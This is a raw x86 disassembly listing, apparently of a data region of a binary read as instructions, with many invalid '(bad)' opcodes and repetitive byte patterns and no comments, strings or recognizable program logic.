  43d346:	inc    DWORD PTR [eax]
  43d348:	add    BYTE PTR [ecx],ah
  43d34a:	inc    DWORD PTR [eax]
  43d34c:	add    BYTE PTR [eax],ah
  43d34e:	inc    DWORD PTR [eax]
  43d350:	add    BYTE PTR [eax],bl
  43d352:	inc    DWORD PTR [eax]
  43d354:	add    BYTE PTR [edi],bl
  43d356:	inc    DWORD PTR [eax]
  43d358:	add    BYTE PTR [edx],ch
  43d35a:	inc    DWORD PTR [eax]
  43d35c:	add    BYTE PTR ds:0x300000ff,bl
  43d362:	inc    DWORD PTR [eax]
  43d364:	add    BYTE PTR [edx],dh
  43d366:	inc    DWORD PTR [eax]
  43d368:	add    BYTE PTR [edi],ah
  43d36a:	inc    DWORD PTR [eax]
  43d36c:	add    BYTE PTR [ecx],ch
  43d36e:	inc    DWORD PTR [eax]
  43d370:	add    BYTE PTR [esi],ch
  43d372:	inc    DWORD PTR [eax]
  43d374:	add    BYTE PTR [esi],bh
  43d376:	inc    DWORD PTR [eax]
  43d378:	add    BYTE PTR [edx-0x1],bl
  43d37b:	add    BYTE PTR [eax],al
  43d37d:	imul   edi,edi,0x0
  43d380:	add    BYTE PTR [ebx-0x44e6eb01],cl
  43d386:	call   DWORD PTR [esi-0x74000f42]
  43d38c:	fdivr  st(3),st
  43d38e:	jmp    DWORD PTR [edx+ebx*8-0x28630020]
  43d395:	fdiv   st(7),st
  43d397:	push   ebx
  43d398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d399:	int3   
  43d39a:	push   DWORD PTR [edx]
  43d39c:	(bad)  
  43d3a0:	int3   
  43d3a1:	out    0xff,al
  43d3a3:	jne    0x43d373
  43d3a5:	jecxz  0x43d3a6
  43d3a7:	jns    0x43d382
  43d3a9:	in     eax,0xff
  43d3ab:	ds (bad) 
  43d3ad:	in     eax,0xff
  43d3af:	dec    eax
  43d3b0:	mov    edx,0xed6bffd5
  43d3b5:	fdivp  st(7),st
  43d3b7:	add    BYTE PTR [edx-0x5be10021],ch
  43d3bd:	call   0xe12931c1
  43d3c2:	push   DWORD PTR [esi-0x1f]
  43d3c5:	in     al,0xff
  43d3c7:	mov    BYTE PTR [esi+0xffe7],ah
  43d3cd:	retf   
  43d3ce:	inc    DWORD PTR [edi]
  43d3d0:	or     al,0xcd
  43d3d2:	dec    edx
  43d3d4:	hlt    
  43d3d5:	idiv   bh
  43d3d7:	test   edi,ecx
  43d3d9:	fdiv   st(7),st
  43d3db:	sbb    BYTE PTR [esi-0x61e00041],bl
  43d3e1:	(bad)  
  43d3e2:	call   FWORD PTR [esi]
  43d3e4:	(bad)
  43d3e7:	das    
  43d3e8:	retf   0xffe8
  43d3eb:	jns    0x43d3b5
  43d3ed:	(bad)  
  43d3ef:	push   esi
  43d3f0:	mov    dh,0xdd
  43d3f2:	dec    DWORD PTR [ebp-0x3a]
  43d3f5:	(bad)  
  43d3f7:	and    DWORD PTR [ecx-0x4dff0006],edi
  43d3fd:	out    0xff,al
  43d3ff:	cmp    bh,BYTE PTR [ebx+edx*8-0x396def01]
  43d406:	inc    DWORD PTR [eax]
  43d408:	stos   DWORD PTR es:[edi],eax
  43d409:	(bad)  
  43d40b:	sub    DWORD PTR [eax-0x4db40028],edi
  43d411:	fcos   
  43d413:	cmp    al,0xba
  43d415:	sar    bh,cl
  43d417:	and    ah,0xdc
  43d41a:	push   ecx
  43d41c:	push   ebp
  43d41e:	dec    DWORD PTR [ecx]
  43d420:	sbb    bl,ch
  43d422:	inc    DWORD PTR [eax]
  43d424:	add    BYTE PTR [edx+0x7f0000ff],dh
  43d42a:	inc    DWORD PTR [eax]
  43d42c:	add    BYTE PTR [ebp-0x1],ah
  43d42f:	add    BYTE PTR [eax],al
  43d431:	push   ecx
  43d432:	inc    DWORD PTR [eax]
  43d434:	add    BYTE PTR [edi],ch
  43d436:	inc    DWORD PTR [eax]
  43d438:	add    BYTE PTR [eax],ch
  43d43a:	inc    DWORD PTR [eax]
  43d43c:	add    BYTE PTR ds:0x260000ff,dh
  43d442:	inc    DWORD PTR [eax]
  43d444:	add    BYTE PTR [edi],ah
  43d446:	inc    DWORD PTR [eax]
  43d448:	add    BYTE PTR [ebx],dh
  43d44a:	inc    DWORD PTR [eax]
  43d44c:	add    BYTE PTR [ecx],dh
  43d44e:	inc    DWORD PTR [eax]
  43d450:	add    BYTE PTR [ecx],bh
  43d452:	inc    DWORD PTR [eax]
  43d454:	add    BYTE PTR [ecx-0x1],al
  43d457:	add    BYTE PTR [eax],al
  43d459:	das    
  43d45a:	inc    DWORD PTR [eax]
  43d45c:	add    BYTE PTR [esi],dh
  43d45e:	inc    DWORD PTR [eax]
  43d460:	add    BYTE PTR [ecx-0x1],al
  43d463:	add    BYTE PTR [eax],al
  43d465:	dec    edx
  43d466:	inc    DWORD PTR [eax]
  43d468:	add    BYTE PTR [eax-0x1],ch
  43d46b:	add    BYTE PTR [eax],al
  43d46d:	cwde   
  43d46e:	dec    DWORD PTR [edi+eiz*1]
  43d471:	(bad)  
  43d473:	push   ebp
  43d474:	jmp    0xf0bad46d
  43d479:	hlt    
  43d47a:	jmp    FWORD PTR [edx-0x28]
  43d47d:	cmc    
  43d47e:	call   DWORD PTR [edx-0x55]
  43d481:	icebp  
  43d482:	push   DWORD PTR ds:0x2affdb95
  43d488:	test   eax,ecx
  43d48a:	call   DWORD PTR [ebx]
  43d48c:	pop    esi
  43d48d:	mov    eax,0xc66e15ff
  43d492:	jmp    FWORD PTR [ecx]
  43d494:	mov    edx,edx
  43d496:	push   DWORD PTR [esi]
  43d498:	jbe    0x43d45c
  43d49a:	call   FWORD PTR [ecx-0x62]
  43d49d:	sar    edi,0x5b
  43d4a0:	mov    al,0xce
  43d4a2:	call   FWORD PTR [ebx-0x53]
  43d4a5:	aam    0xff
  43d4a7:	push   eax
  43d4a8:	mov    esi,0xcc5dffdc
  43d4ad:	fdivp  st(7),st
  43d4af:	mov    al,0xca
  43d4b1:	out    dx,eax
  43d4b2:	push   DWORD PTR ds:0xffd946
  43d4b8:	add    dh,BYTE PTR [eax-0x1d3d7901]
  43d4be:	(bad)  
  43d4bf:	mov    ebx,0x24ffedf4
  43d4c4:	xor    ebx,esp
  43d4c6:	jmp    FWORD PTR [ebx]
  43d4c8:	inc    ecx
  43d4c9:	(bad)  
  43d4cb:	mov    bh,0xef
  43d4cd:	out    0xff,al
  43d4cf:	dec    edi
  43d4d0:	mov    edx,0xa355ffdb
  43d4d5:	sar    edi,1
  43d4d7:	push   ecx
  43d4d8:	popf   
  43d4d9:	retf   
  43d4da:	call   FWORD PTR [ebx-0x53]
  43d4dd:	sar    edi,cl
  43d4df:	pusha  
  43d4e0:	mov    cl,0xd7
  43d4e2:	jmp    DWORD PTR [ecx-0x4f]
  43d4e5:	aam    0xff
  43d4e7:	popa   
  43d4e8:	mov    bl,0xd3
  43d4ea:	push   DWORD PTR [ebx-0x39]
  43d4ed:	loop   0x43d4ee
  43d4ef:	jl     0x43d4c0
  43d4f1:	(bad)  
  43d4f3:	jne    0x43d4bf
  43d4f5:	loop   0x43d4f6
  43d4f7:	pop    edx
  43d4f8:	ret    0xffdd
  43d4fb:	mov    dl,bh
  43d4fd:	out    0xff,eax
  43d4ff:	dec    edi
  43d500:	dec    edx
  43d501:	fdivr  st,st(7)
  43d503:	add    BYTE PTR [eax],al
  43d505:	enter  0x4bff,0x75
  43d509:	enter  0xc6ff,0xff
  43d50d:	stc    
  43d50e:	push   DWORD PTR [ecx+0x2ffead9]
  43d514:	add    al,0xaa
  43d516:	inc    DWORD PTR [eax]
  43d518:	add    BYTE PTR [edi+edi*8+0x0],bh
  43d51c:	add    BYTE PTR [ecx-0x1],ah
  43d51f:	add    BYTE PTR [eax],al
  43d521:	dec    eax
  43d522:	inc    DWORD PTR [eax]
  43d524:	add    BYTE PTR [ecx],ah
  43d526:	inc    DWORD PTR [eax]
  43d528:	add    BYTE PTR [edi],bl
  43d52a:	inc    DWORD PTR [eax]
  43d52c:	add    BYTE PTR [ecx],ah
  43d52e:	inc    DWORD PTR [eax]
  43d530:	add    BYTE PTR [edx],bl
  43d532:	inc    DWORD PTR [eax]
  43d534:	add    BYTE PTR [edi],bl
  43d536:	inc    DWORD PTR [eax]
  43d538:	add    BYTE PTR [eax],bl
  43d53a:	inc    DWORD PTR [eax]
  43d53c:	add    BYTE PTR [eax],ah
  43d53e:	inc    DWORD PTR [eax]
  43d540:	add    BYTE PTR [edx],bl
  43d542:	inc    DWORD PTR [eax]
  43d544:	add    BYTE PTR [ebx],dl
  43d546:	inc    DWORD PTR [eax]
  43d548:	add    BYTE PTR [edx],dl
  43d54a:	inc    DWORD PTR [eax]
  43d54c:	add    BYTE PTR [ecx],ah
  43d54e:	inc    DWORD PTR [eax]
  43d550:	add    BYTE PTR [ecx],bl
  43d552:	inc    DWORD PTR [eax]
  43d554:	add    BYTE PTR [edx],bl
  43d556:	inc    DWORD PTR [eax]
  43d558:	add    BYTE PTR [edi+edi*8],ah
  43d55b:	add    BYTE PTR [eax],al
  43d55d:	xor    bh,bh
  43d55f:	add    BYTE PTR [eax],al
  43d561:	xor    edi,edi
  43d563:	add    BYTE PTR [eax],al
  43d565:	cmp    edi,edi
  43d567:	add    BYTE PTR [eax],al
  43d569:	dec    esi
  43d56a:	inc    DWORD PTR [eax]
  43d56c:	add    BYTE PTR [eax-0x1],bl
  43d56f:	add    BYTE PTR [eax],al
  43d571:	push   esp
  43d572:	inc    DWORD PTR [eax]
  43d574:	add    BYTE PTR [ebx-0x1],ah
  43d577:	add    BYTE PTR [eax],al
  43d579:	jg     0x43d57a
  43d57b:	add    BYTE PTR [eax],al
  43d57d:	call   0xaeff:0xcb4032ff
  43d584:	shl    ebp,cl
  43d586:	jmp    DWORD PTR [ecx-0x48]
  43d589:	jecxz  0x43d58a
  43d58b:	jle    0x43d54b
  43d58d:	sar    edi,cl
  43d58f:	(bad)  
  43d590:	clc    
  43d591:	out    dx,al
  43d592:	inc    DWORD PTR [edx+0x5effdcd2]
  43d598:	mov    edi,0xba51ffd8
  43d59d:	(bad)  
  43d59f:	push   esp
  43d5a0:	mov    eax,0xbf68ffd9
  43d5a5:	fdivr  st,st(7)
  43d5a7:	push   esi
  43d5a8:	rcl    bl,0xff
  43d5ab:	ds leave 
  43d5ad:	(bad)  
  43d5af:	cmp    DWORD PTR [ecx-0x2d700036],ebp
  43d5b5:	sar    bh,1
  43d5b7:	pop    edx
  43d5b8:	retf   
  43d5b9:	jmp    0xe0ff:0xffc7a8ff
  43d5c0:	(bad)  
  43d5c1:	hlt    
  43d5c2:	push   DWORD PTR [ecx+esi*8-0x7490000e]
  43d5c9:	jecxz  0x43d5ca
  43d5cb:	add    BYTE PTR [eax],al
  43d5cd:	leave  
  43d5ce:	dec    DWORD PTR [edx]
  43d5d0:	adc    ecx,ecx
  43d5d2:	(bad)  
  43d5d3:	mov    edi,0x83fff4ee
  43d5d8:	(bad)
  43d5db:	sub    eax,esp
  43d5dd:	fcos   
  43d5df:	sub    eax,0x3fffc288
  43d5e4:	xchg   edx,eax
  43d5e5:	(bad)  
  43d5e6:	inc    DWORD PTR [ecx-0x4e]
  43d5e9:	out    0xff,al
  43d5eb:	push   eax
  43d5ec:	lods   eax,DWORD PTR ds:[esi]
  43d5ed:	aad    0xff
  43d5ef:	jb     0x43d5ab
  43d5f1:	(bad)  
  43d5f3:	pop    esp
  43d5f4:	mov    bh,0xe2
  43d5f6:	call   FWORD PTR [esi]
  43d5f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d5f9:	jecxz  0x43d5fa
  43d5fb:	add    BYTE PTR [ebx-0x68fb0024],bh
  43d601:	stc    
  43d602:	call   DWORD PTR [edx-0x32]
  43d605:	lock call DWORD PTR [ebx+ebp*4]
  43d609:	(bad)  
  43d60b:	inc    ebp
  43d60c:	mov    esi,0xb94effdc
  43d611:	fdiv   st(7),st
  43d613:	cmp    al,0xc3
  43d615:	fcos   
  43d617:	fdivr  st,st(7)
  43d619:	jmp    0xff:0xffe7bdff
  43d620:	add    al,cl
  43d622:	inc    DWORD PTR [eax]
  43d624:	add    BYTE PTR [ebx+0x6d0000ff],bl
  43d62a:	inc    DWORD PTR [eax]
  43d62c:	add    BYTE PTR [ecx-0x1],cl
  43d62f:	add    BYTE PTR [eax],al
  43d631:	cmp    bh,bh
  43d633:	add    BYTE PTR [eax],al
  43d635:	cmp    eax,0x380000ff
  43d63a:	inc    DWORD PTR [eax]
  43d63c:	add    BYTE PTR [eax],ch
  43d63e:	inc    DWORD PTR [eax]
  43d640:	add    BYTE PTR [ebx],ch
  43d642:	inc    DWORD PTR [eax]
  43d644:	add    BYTE PTR [edi],dh
  43d646:	inc    DWORD PTR [eax]
  43d648:	add    BYTE PTR [ebx],bh
  43d64a:	inc    DWORD PTR [eax]
  43d64c:	add    BYTE PTR [esi],dh
  43d64e:	inc    DWORD PTR [eax]
  43d650:	add    BYTE PTR [edi+edi*8],bh
  43d653:	add    BYTE PTR [eax],al
  43d655:	inc    DWORD PTR ss:[eax]
  43d658:	add    BYTE PTR ds:0x3a0000ff,ah
  43d65e:	inc    DWORD PTR [eax]
  43d660:	add    BYTE PTR [edi+edi*8+0x0],al
  43d664:	add    BYTE PTR [eax-0x1],cl
  43d667:	add    BYTE PTR [eax],al
  43d669:	pop    ebx
  43d66a:	inc    DWORD PTR [eax]
  43d66c:	add    BYTE PTR [ebp-0x1],dh
  43d66f:	add    DWORD PTR [edx],eax
  43d671:	mov    al,0xff
  43d673:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  43d675:	call   0xf12e2d79
  43d67a:	push   DWORD PTR [eax-0x12]
  43d67d:	hlt    
  43d67e:	jmp    DWORD PTR [ecx-0x46]
  43d681:	idiv   edi
  43d683:	and    edi,DWORD PTR [edi-0x1f]
  43d686:	call   DWORD PTR [edx]
  43d688:	nop
  43d689:	aad    0xff
  43d68b:	das    
  43d68c:	mov    dl,0xdf
  43d68e:	jmp    DWORD PTR [ebx]
  43d690:	or     esi,0xffffffff
  43d693:	and    dh,BYTE PTR [esi-0x3a]
  43d696:	jmp    DWORD PTR [ecx]
  43d698:	jl     0x43d661
  43d69a:	inc    DWORD PTR [ebx-0x5a]
  43d69d:	into   
  43d69e:	dec    DWORD PTR [ecx-0x6a]
  43d6a1:	sar    edi,0x46
  43d6a4:	stos   BYTE PTR es:[edi],al
  43d6a5:	fdivp  st(7),st
  43d6a7:	dec    esp
  43d6a8:	scas   eax,DWORD PTR es:[edi]
  43d6a9:	(bad)  
  43d6aa:	dec    DWORD PTR [edi-0x4d]
  43d6ad:	aam    0xff
  43d6af:	xchg   ecx,eax
  43d6b0:	(bad)  
  43d6b1:	jecxz  0x43d6b2
  43d6b3:	push   eax
  43d6b4:	outs   dx,BYTE PTR ds:[esi]
  43d6b5:	(bad)  
  43d6b7:	add    BYTE PTR [eax],al
  43d6b9:	(bad)  
  43d6ba:	(bad)  
  43d6bb:	js     0x43d654
  43d6bd:	jmp    0x43d6be
  43d6bf:	mov    ebx,0x6cffeef5
  43d6c4:	test   bl,ah
  43d6c6:	inc    DWORD PTR [eax]
  43d6c8:	add    dl,bl
  43d6ca:	(bad)  
  43d6cb:	mov    eax,0x5fffeada
  43d6d0:	retf   
  43d6d1:	(bad)  
  43d6d3:	pop    esp
  43d6d4:	mov    ch,0xdb
  43d6d6:	call   FWORD PTR [eax-0x5d]
  43d6d9:	sar    bh,1
  43d6db:	popa   
  43d6dc:	mov    ecx,0xb763ffdb
  43d6e1:	fcos   
  43d6e3:	dec    ebx
  43d6e4:	xchg   ecx,eax
  43d6e5:	int3   
  43d6e6:	call   DWORD PTR [edx-0x5f]
  43d6e9:	iret   
  43d6ea:	jmp    FWORD PTR [ecx-0x4a]
  43d6ed:	(bad)  
  43d6ef:	jg     0x43d6c3
  43d6f1:	loope  0x43d6f2
  43d6f3:	inc    edi
  43d6f4:	lahf   
  43d6f5:	into   
  43d6f6:	push   DWORD PTR [esi]
  43d6f8:	xchg   ebp,eax
  43d6f9:	sar    bh,1
  43d6fb:	pop    ds
  43d6fc:	xchg   ecx,ecx
  43d6fe:	call   esi
  43d700:	idiv   ch
  43d702:	call   DWORD PTR [edi+0x4c]
  43d705:	in     eax,0xff
  43d707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d708:	leave  
  43d709:	bnd jmp DWORD PTR [edx+edi*4-0x21]
  43d70e:	(bad)  
  43d70f:	(bad)  
  43d711:	idiv   edi
  43d713:	pop    edi
  43d714:	mov    ebp,ebp
  43d716:	inc    DWORD PTR [eax]
  43d718:	add    BYTE PTR [ebx+0x710000ff],ah
  43d71e:	inc    DWORD PTR [eax]
  43d720:	add    BYTE PTR [eax-0x1],bl
  43d723:	add    BYTE PTR [eax],al
  43d725:	inc    DWORD PTR cs:[eax]
  43d728:	add    BYTE PTR [esi],bl
  43d72a:	inc    DWORD PTR [eax]
  43d72c:	add    BYTE PTR [edx],ah
  43d72e:	inc    DWORD PTR [eax]
  43d730:	add    BYTE PTR ds:0x1a0000ff,bl
  43d736:	inc    DWORD PTR [eax]
  43d738:	add    BYTE PTR [ecx],bl
  43d73a:	inc    DWORD PTR [eax]
  43d73c:	add    BYTE PTR ds:0x140000ff,bl
  43d742:	inc    DWORD PTR [eax]
  43d744:	add    BYTE PTR [esi],dl
  43d746:	inc    DWORD PTR [eax]
  43d748:	add    BYTE PTR [eax],ah
  43d74a:	inc    DWORD PTR [eax]
  43d74c:	add    BYTE PTR [edi],bl
  43d74e:	inc    DWORD PTR [eax]
  43d750:	add    BYTE PTR [edx],bl
  43d752:	inc    DWORD PTR [eax]
  43d754:	add    BYTE PTR ds:0x350000ff,ah
  43d75a:	inc    DWORD PTR [eax]
  43d75c:	add    BYTE PTR [edi+edi*8+0x0],al
  43d760:	add    BYTE PTR [edi-0x1],cl
  43d763:	add    BYTE PTR [eax],al
  43d765:	push   ebx
  43d766:	inc    DWORD PTR [eax]
  43d768:	add    BYTE PTR [edx-0x1],bl
  43d76b:	add    BYTE PTR [eax],al
  43d76d:	jne    0x43d76e
  43d76f:	add    BYTE PTR [eax],al
  43d771:	mov    ?,edi
  43d773:	add    BYTE PTR [eax],al
  43d775:	mov    al,ds:0xbf2017ff
  43d77a:	(bad)  
  43d77b:	jns    0x43d712
  43d77d:	out    0xff,eax
  43d77f:	retf   
  43d780:	cld    
  43d781:	cli    
  43d782:	dec    DWORD PTR [esi+ecx*8-0x3b89001c]
  43d789:	sar    edi,cl
  43d78b:	mov    eax,ds:0x99ffddd8
  43d790:	div    eax
  43d792:	(bad)  
  43d793:	js     0x43d761
  43d795:	sar    bh,1
  43d797:	dec    ebp
  43d798:	mov    eax,0xc257ffcc
  43d79d:	jecxz  0x43d79e
  43d79f:	imul   ecx,eax,0xbd62ffe1
  43d7a5:	iret   
  43d7a6:	inc    DWORD PTR [edx-0x53]
  43d7a9:	leave  
  43d7aa:	(bad)  
  43d7ab:	cmp    eax,0x2effd4c0
  43d7b0:	lahf   
  43d7b1:	(bad)  
  43d7b2:	(bad)  
  43d7b3:	cmp    BYTE PTR [edi-0x10770026],bh
  43d7b9:	jmp    0x43d7ba
  43d7bb:	sar    bh,cl
  43d7bd:	stc    
  43d7be:	jmp    FWORD PTR [ecx-0x7d]
  43d7c1:	(bad)  
  43d7c3:	mov    DWORD PTR [edi+0x7b61ffe8],ebp
  43d7c9:	(bad)  
  43d7cb:	add    BYTE PTR [eax],al
  43d7cd:	enter  0x34ff,0x55
  43d7d1:	xlat   BYTE PTR ds:[ebx]
  43d7d2:	inc    edi
  43d7d4:	sti    
  43d7d5:	stc    
  43d7d6:	inc    DWORD PTR [edx-0x4d]
  43d7d9:	(bad)  
  43d7db:	push   es
  43d7dc:	mov    ebx,0xb81dffd3
  43d7e1:	sar    bh,cl
  43d7e3:	pop    edx
  43d7e4:	mov    al,0xda
  43d7e6:	call   DWORD PTR [edx-0x41]
  43d7e9:	in     al,0xff
  43d7eb:	inc    edx
  43d7ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d7ed:	xlat   BYTE PTR ds:[ebx]
  43d7ee:	dec    DWORD PTR [ecx+0x5cffe1ca]
  43d7f4:	test   al,0xd9
  43d7f6:	push   DWORD PTR [edx]
  43d7f8:	mov    ss,ecx
  43d7fa:	(bad)  
  43d7fb:	jl     0x43d7fc
  43d7fd:	cld    
  43d7fe:	inc    DWORD PTR [ebp+0x7bffe2d0]
  43d804:	mov    esi,0xca53ffd0
  43d809:	loopne 0x43d80a
  43d80b:	cmp    BYTE PTR [ebp+ebx*8-0x2d59bb01],bh
  43d812:	(bad)  
  43d813:	cmp    eax,0xf2ffd3bd
  43d818:	push   ecx
  43d81a:	(bad)  
  43d81b:	jle    0x43d7a0
  43d81d:	sti    
  43d81e:	inc    DWORD PTR [eax]
  43d820:	add    cl,al
  43d822:	inc    DWORD PTR [eax]
  43d824:	add    BYTE PTR [esi+0x640000ff],cl
  43d82a:	inc    DWORD PTR [eax]
  43d82c:	add    BYTE PTR [eax-0x1],al
  43d82f:	add    BYTE PTR [eax],al
  43d831:	xor    eax,0x310000ff
  43d836:	inc    DWORD PTR [eax]
  43d838:	add    BYTE PTR [esi],dh
  43d83a:	inc    DWORD PTR [eax]
  43d83c:	add    BYTE PTR [ecx],bh
  43d83e:	inc    DWORD PTR [eax]
  43d840:	add    BYTE PTR [edx],ch
  43d842:	inc    DWORD PTR [eax]
  43d844:	add    BYTE PTR ds:0x2f0000ff,dh
  43d84a:	inc    DWORD PTR [eax]
  43d84c:	add    BYTE PTR [ecx-0x1],al
  43d84f:	add    BYTE PTR [eax],al
  43d851:	dec    ebp
  43d852:	inc    DWORD PTR [eax]
  43d854:	add    BYTE PTR [edx],bh
  43d856:	inc    DWORD PTR [eax]
  43d858:	add    BYTE PTR [ecx],bh
  43d85a:	inc    DWORD PTR [eax]
  43d85c:	add    BYTE PTR [edi+edi*8],dh
  43d85f:	add    BYTE PTR [eax],al
  43d861:	aas    
  43d862:	inc    DWORD PTR [eax]
  43d864:	add    BYTE PTR [edx-0x1],al
  43d867:	add    BYTE PTR [eax],al
  43d869:	dec    edi
  43d86a:	inc    DWORD PTR [eax]
  43d86c:	add    BYTE PTR [esi-0x1],bh
  43d86f:	add    BYTE PTR [eax],al
  43d871:	pushf  
  43d872:	jmp    DWORD PTR [edx]
  43d874:	push   edi
  43d875:	fdivp  st(7),st
  43d877:	pop    edx
  43d878:	icebp  
  43d879:	icebp  
  43d87a:	call   FWORD PTR [edx-0x23]
  43d87d:	out    dx,al
  43d87e:	call   DWORD PTR [edi+eiz*8-0x4cd50009]
  43d885:	sti    
  43d886:	call   DWORD PTR [eax]
  43d888:	nop
  43d889:	aad    0xff
  43d88b:	xor    DWORD PTR [ecx-0x45],esi
  43d88e:	jmp    FWORD PTR [edx]
  43d890:	jg     0x43d856
  43d892:	jmp    DWORD PTR [ecx]
  43d894:	pop    ebx
  43d895:	mov    ch,0xff
  43d897:	cmp    al,0x95
  43d899:	sar    bh,1
  43d89b:	(bad)
  43d8a0:	adc    ebp,0xffffffff
  43d8a3:	cmp    cl,BYTE PTR [eax+ebx*8-0x335bb001]
  43d8aa:	call   FWORD PTR [edi]
  43d8ac:	jnp    0x43d87b
  43d8ae:	dec    DWORD PTR [ebp-0x69]
  43d8b1:	xlat   BYTE PTR ds:[ebx]
  43d8b2:	inc    DWORD PTR [ebx+0x73]
  43d8b5:	fdivp  st(7),st
  43d8b7:	add    DWORD PTR [edx],eax
  43d8b9:	(bad)  
  43d8ba:	dec    DWORD PTR [esi]
  43d8bc:	adc    ecx,ebp
  43d8be:	inc    eax
  43d8c0:	hlt    
  43d8c1:	hlt    
  43d8c2:	push   DWORD PTR [ecx+0xffedd7]
  43d8c8:	add    dl,bl
  43d8ca:	jmp    DWORD PTR [ecx+0x67]
  43d8cd:	out    0xff,eax
  43d8cf:	sahf   
  43d8d0:	in     eax,0xe2
  43d8d2:	jmp    DWORD PTR [eax-0x38]
  43d8d5:	loope  0x43d8d6
  43d8d7:	bound  edi,QWORD PTR [esi-0x54a80021]
  43d8dd:	(bad)  
  43d8de:	jmp    DWORD PTR [esi-0x43]
  43d8e1:	(bad)  
  43d8e3:	push   0x5dffead2
  43d8e8:	mov    dl,0xd9
  43d8ea:	call   FWORD PTR [esi-0x52]
  43d8ed:	aam    0xff
  43d8ef:	popa   
  43d8f0:	mov    edx,0xa94effdb
  43d8f5:	aad    0xff
  43d8f7:	dec    esp
  43d8f8:	test   eax,0xad41ffd5
  43d8fd:	fcos   
  43d8ff:	cmp    cl,bh
  43d901:	in     al,dx
  43d902:	dec    DWORD PTR [eax-0x1e001356]
  43d908:	clc    
  43d909:	cmc    
  43d90a:	inc    DWORD PTR [ebx-0x32]
  43d90d:	call   0xf743ab11
  43d912:	dec    ebx
  43d914:	(bad)  
  43d915:	stc    
  43d916:	inc    DWORD PTR ds:0xffde0e
  43d91c:	add    BYTE PTR [edi+0x5d0000ff],cl
  43d922:	inc    DWORD PTR [eax]
  43d924:	add    BYTE PTR [ecx],bh
  43d926:	inc    DWORD PTR [eax]
  43d928:	add    BYTE PTR [esi],ah
  43d92a:	inc    DWORD PTR [eax]
  43d92c:	add    BYTE PTR ds:0x1f0000ff,ah
  43d932:	inc    DWORD PTR [eax]
  43d934:	add    BYTE PTR [esi],ah
  43d936:	inc    DWORD PTR [eax]
  43d938:	add    BYTE PTR [ecx],ah
  43d93a:	inc    DWORD PTR [eax]
  43d93c:	add    BYTE PTR [eax],ah
  43d93e:	inc    DWORD PTR [eax]
  43d940:	add    BYTE PTR [edx],bl
  43d942:	inc    DWORD PTR [eax]
  43d944:	add    BYTE PTR [ebx],dl
  43d946:	inc    DWORD PTR [eax]
  43d948:	add    BYTE PTR [edi],dl
  43d94a:	inc    DWORD PTR [eax]
  43d94c:	add    BYTE PTR [ebx],ah
  43d94e:	inc    DWORD PTR [eax]
  43d950:	add    BYTE PTR [edx],bl
  43d952:	inc    DWORD PTR [eax]
  43d954:	add    BYTE PTR ds:0x450000ff,ch
  43d95a:	inc    DWORD PTR [eax]
  43d95c:	add    BYTE PTR [ebx-0x1],dl
  43d95f:	add    BYTE PTR [eax],al
  43d961:	ins    BYTE PTR es:[edi],dx
  43d962:	inc    DWORD PTR [eax]
  43d964:	add    BYTE PTR [edi+edi*8+0x0],bh
  43d968:	add    BYTE PTR [ebx-0x54f2f601],dl
  43d96e:	jmp    DWORD PTR [ebx]
  43d970:	sub    eax,0x9074ffc5
  43d975:	in     al,0xff
  43d977:	aad    0xed
  43d979:	clc    
  43d97a:	push   eax
  43d97c:	(bad)  
  43d97d:	cld    
  43d97e:	push   DWORD PTR [edi-0x63001b2a]
  43d984:	loop   0x43d969
  43d986:	jmp    DWORD PTR [esi-0x77001e1d]
  43d98c:	iret   
  43d98d:	(bad)  
  43d98f:	xchg   edi,eax
  43d990:	call   0xac93d97a
  43d995:	out    dx,eax
  43d996:	call   FWORD PTR [ebx+edi*4-0x28]
  43d99a:	jmp    DWORD PTR [ecx-0x41]
  43d99d:	(bad)  
  43d99f:	js     0x43d974
  43d9a1:	out    0xff,al
  43d9a3:	xchg   ebp,eax
  43d9a4:	frstpm(287 only) 
  43d9a6:	(bad)  
  43d9a7:	cmp    eax,0x3affcaad
  43d9ac:	mov    ch,0xd1
  43d9ae:	jmp    FWORD PTR [ebx+ebx*4]
  43d9b1:	sar    bh,0x0
  43d9b4:	popf   
  43d9b5:	retf   0xa3ff
  43d9b8:	jmp    0xfff7:0xffd4fff0
  43d9bf:	add    BYTE PTR [eax],al
  43d9c1:	sar    bh,0x8
  43d9c4:	or     eax,ebp
  43d9c6:	call   FWORD PTR [eax]
  43d9c8:	push   ds
  43d9c9:	mov    ebx,0xbc0000ff
  43d9ce:	inc    DWORD PTR [edi+0x6d]
  43d9d1:	loopne 0x43d9d2
  43d9d3:	mov    edi,0x64fff4f9
  43d9d8:	xlat   BYTE PTR ds:[ebx]
  43d9d9:	out    0xff,al
  43d9db:	ins    DWORD PTR es:[edi],dx
  43d9dc:	scas   eax,DWORD PTR es:[edi]
  43d9dd:	(bad)  
  43d9de:	(bad)  
  43d9df:	jl     0x43d99e
  43d9e1:	sar    edi,cl
  43d9e3:	pop    eax
  43d9e4:	mov    ch,0xd8
  43d9e6:	call   DWORD PTR [ebp-0x44]
  43d9e9:	fdivp  st(7),st
  43d9eb:	inc    esi
  43d9ec:	lods   al,BYTE PTR ds:[esi]
  43d9ed:	(bad)  
  43d9ef:	fs mov edx,0xc684ffdd
  43d9f5:	(bad)  
  43d9f7:	dec    esi
  43d9f8:	mov    cl,0xdd
  43d9fa:	call   FWORD PTR [edi-0x9]
  43d9fd:	cld    
  43d9fe:	push   DWORD PTR [ebp-0x1]
  43da01:	stc    
  43da02:	inc    DWORD PTR [ebx]
  43da04:	(bad)  
  43da05:	sar    bh,1
  43da07:	jg     0x43d9d6
  43da09:	loopne 0x43da0a
  43da0b:	inc    edx
  43da0c:	mov    bh,0xdb
  43da0e:	(bad)  
  43da0f:	cmp    BYTE PTR [edi-0x2bb30030],bl
  43da15:	sar    edi,cl
  43da17:	call   0x143d51b
  43da1c:	sbb    ecx,esi
  43da1e:	inc    DWORD PTR [eax]
  43da20:	add    DWORD PTR [ebp+0x7a0000ff],ebp
  43da26:	inc    DWORD PTR [eax]
  43da28:	add    BYTE PTR [edx-0x1],ah
  43da2b:	add    BYTE PTR [eax],al
  43da2d:	cmp    eax,0x380000ff
  43da32:	inc    DWORD PTR [eax]
  43da34:	add    BYTE PTR [edi+edi*8],dh
  43da37:	add    BYTE PTR [eax],al
  43da39:	and    eax,0x3e0000ff
  43da3e:	inc    DWORD PTR [eax]
